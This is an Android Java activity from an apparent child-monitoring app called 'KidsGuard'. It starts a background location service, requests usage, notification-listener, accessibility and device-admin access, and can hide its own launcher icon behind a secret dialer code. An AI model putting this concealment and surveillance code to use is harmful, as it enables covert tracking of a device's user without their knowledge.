package com.kidsguard.child;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AppOpsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int REQ_CRITICAL = 101;
    SharedPreferences prefs;
    TextView tvDeviceId;
    Button btnStartService, btnStopService, btnHideApp, btnPermissions,
           btnAccessibility, btnDeviceAdmin, btnNotifAccess;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences(LocationService.PREFS, 0);
        tvDeviceId = findViewById(R.id.tvDeviceId);
        btnStartService = findViewById(R.id.btnStartService);
        btnStopService = findViewById(R.id.btnStopService);
        btnHideApp = findViewById(R.id.btnHideApp);
        btnPermissions = findViewById(R.id.btnPermissions);
        btnAccessibility = findViewById(R.id.btnAccessibility);
        btnDeviceAdmin = findViewById(R.id.btnDeviceAdmin);
        btnNotifAccess = findViewById(R.id.btnNotifAccess);

        String deviceId = LocationService.getSafeDeviceId(this);
        if (deviceId == null || deviceId.isEmpty()) {
            tvDeviceId.setText("Device code unavailable");
            btnStartService.setEnabled(false);
        } else {
            tvDeviceId.setText("Device Code: " + deviceId);
        }

        btnStartService.setOnClickListener(v -> startChildService());
        btnStopService.setOnClickListener(v -> {
            stopService(new Intent(MainActivity.this, LocationService.class));
            Toast.makeText(this, "Service stopped", Toast.LENGTH_SHORT).show();
        });
        btnHideApp.setOnClickListener(v -> showHideDialog());
        btnPermissions.setOnClickListener(v -> requestCriticalPermissions());
        btnAccessibility.setOnClickListener(v ->
                openSafely(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
        btnDeviceAdmin.setOnClickListener(v -> {
            Intent intent = new Intent(
                    android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                    new ComponentName(MainActivity.this, AdminReceiver.class));
            openSafely(intent);
        });
        btnNotifAccess.setOnClickListener(v ->
                openSafely(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)));

        startChildService();
    }

    private void startChildService() {
        if (LocationService.isRunning()) {
            Toast.makeText(this, "Service already running", Toast.LENGTH_SHORT).show();
            return;
        }
        try {
            Intent i = new Intent(this, LocationService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(i);
            else startService(i);
            Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Start failed: " + e.getClass().getSimpleName(),
                    Toast.LENGTH_LONG).show();
        }
    }

    private void showHideDialog() {
        new AlertDialog.Builder(this)
                .setTitle("Hide App Icon")
                .setMessage("App icon will be hidden. Dial *#*#12345#*#* to reopen.")
                .setPositiveButton("HIDE", (d, w) -> hideAppIcon())
                .setNegativeButton("CANCEL", null)
                .show();
    }

    private void hideAppIcon() {
        try {
            PackageManager pm = getPackageManager();
            ComponentName cn = new ComponentName(this,
                    "com.kidsguard.child.MainActivityLauncher");
            PackageInfo info = pm.getPackageInfo(getPackageName(),
                    PackageManager.GET_ACTIVITIES);
            boolean present = false;
            if (info.activities != null) {
                for (ActivityInfo ai : info.activities) {
                    if (cn.getClassName().equals(ai.name)) { present = true; break; }
                }
            }
            if (!present) {
                Toast.makeText(this, "Launcher alias missing — hide aborted",
                        Toast.LENGTH_LONG).show();
                return;
            }
            pm.setComponentEnabledSetting(cn,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            Intent home = new Intent(Intent.ACTION_MAIN);
            home.addCategory(Intent.CATEGORY_HOME);
            home.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(home);
        } catch (Exception e) {
            Toast.makeText(this, "Hide failed: " + e.getClass().getSimpleName(),
                    Toast.LENGTH_LONG).show();
        }
    }

    private void openSafely(Intent i) {
        try { startActivity(i); }
        catch (android.content.ActivityNotFoundException e) {
            Toast.makeText(this, "Open Settings manually", Toast.LENGTH_LONG).show();
        }
    }

    // Contextual: only critical perms now; SMS/Camera requested per-feature
    private void requestCriticalPermissions() {
        if (Build.VERSION.SDK_INT < 23) { checkSpecialPermissions(); return; }
        String[] critical = {
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.ACCESS_COARSE_LOCATION
        };
        List<String> needed = new ArrayList<>();
        for (String p : critical) {
            if (ContextCompat.checkSelfPermission(this, p)
                    != PackageManager.PERMISSION_GRANTED) needed.add(p);
        }
        if (!needed.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    needed.toArray(new String[0]), REQ_CRITICAL);
        } else {
            checkSpecialPermissions();
        }
    }

    private void checkSpecialPermissions() {
        if (!hasUsageStatsPermission()) {
            Toast.makeText(this, "Usage Access required", Toast.LENGTH_LONG).show();
            openSafely(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
            return;
        }
        if (!isNotificationListenerEnabled()) {
            Toast.makeText(this, "Notification Access required", Toast.LENGTH_LONG).show();
            openSafely(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            return;
        }
        Toast.makeText(this, "All permissions verified", Toast.LENGTH_SHORT).show();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions,
                                           int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != REQ_CRITICAL) return;
        List<String> denied = new ArrayList<>();
        for (int i = 0; i < grantResults.length; i++) {
            if (grantResults[i] != PackageManager.PERMISSION_GRANTED)
                denied.add(permissions[i]);
        }
        if (denied.isEmpty()) { checkSpecialPermissions(); return; }
        boolean permanent = true;
        for (String p : denied) {
            if (shouldShowRequestPermissionRationale(p)) { permanent = false; break; }
        }
        if (permanent) {
            new AlertDialog.Builder(this)
                    .setTitle("Permission required")
                    .setMessage("Enable in app settings.")
                    .setPositiveButton("OPEN SETTINGS", (d, w) ->
                            openSafely(new Intent(
                                    Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                    Uri.parse("package:" + getPackageName()))))
                    .setNegativeButton("CANCEL", null).show();
        } else {
            Toast.makeText(this, "Denied: " + denied.size(), Toast.LENGTH_LONG).show();
        }
    }

    private boolean isNotificationListenerEnabled() {
        String flat = Settings.Secure.getString(getContentResolver(),
                "enabled_notification_listeners");
        return flat != null && flat.contains(getPackageName());
    }

    // Reliable: AppOpsManager, not empty-data guess
    private boolean hasUsageStatsPermission() {
        AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT && appOps != null) {
            int mode = appOps.checkOpNoThrow(
                    AppOpsManager.OPSTR_GET_USAGE_STATS,
                    android.os.Process.myUid(), getPackageName());
            return mode == AppOpsManager.MODE_ALLOWED;
        }
        return false;
    }
}
